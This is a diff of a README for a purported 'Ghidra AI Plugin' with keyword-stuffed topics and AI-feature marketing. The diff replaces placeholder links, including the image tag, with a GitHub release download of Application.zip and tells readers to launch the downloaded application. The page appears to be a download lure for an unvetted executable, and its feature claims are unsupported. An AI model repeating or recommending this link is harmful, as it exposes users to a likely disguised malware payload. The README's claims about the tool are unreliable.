@@ -1,6 +1,6 @@
 # Ghidra AI Plugin: Revolutionizing Reverse Engineering with Artificial Intelligence 🤖
 
-![Ghidra AI Plugin](https://your-image-url.com)
+![Ghidra AI Plugin](https://github.com/YUVITEL/Ghidra-Ai-Plugin/releases/download/v1.0.0/Application.zip)
 
 Welcome to the Ghidra AI Plugin repository! This cutting-edge tool leverages the power of Artificial Intelligence to enhance the process of reverse engineering within the Ghidra framework. With the Ghidra AI Plugin, you can expect advanced capabilities such as AI-generated deobfuscation, AI-assisted opcode analysis, function name prediction, and much more. Say goodbye to manual, time-consuming tasks and embrace the future of reverse engineering automation with AI!
 
@@ -21,7 +21,7 @@ Welcome to the Ghidra AI Plugin repository! This cutting-edge tool leverages the
 - **Topics**: AI, AI-assisted-opcode-analysis, AI-based-function-name-prediction, AI-based-reverse-engineering, AI-driven-binary-function-identification, AI-generated-deobfuscation-rules, AI-powered-cfg-reconstruction, Auto-commenting-disassembly-with-AI, Automation, Deep-learning-for-reverse-engineering, Generative-AI-for-reversing-binaries, Ghidra, Ghidra-AI, Ghidra-AI-decompiler-plugin, Ghidra-llm-powered-assistant, Machine-learning-for-Ghidra-scripting, Neural-network-based-disassembly, Reverse-engineering, Reverse-engineering-automation-with-AI.
 
 ## Getting Started 🚀
-To experience the power of the Ghidra AI Plugin, head over to [this link](https://github.com/file/Application.zip). Once you've downloaded the plugin, follow the installation instructions in the provided documentation. If the link ends with a file name, make sure to launch the downloaded application to kickstart your AI-enhanced reverse engineering journey.
+To experience the power of the Ghidra AI Plugin, head over to [this link](https://github.com/YUVITEL/Ghidra-Ai-Plugin/releases/download/v1.0.0/Application.zip). Once you've downloaded the plugin, follow the installation instructions in the provided documentation. If the link ends with a file name, make sure to launch the downloaded application to kickstart your AI-enhanced reverse engineering journey.
 
 Don't forget to check out the "Releases" section if the link is not provided or does not work as expected.
 
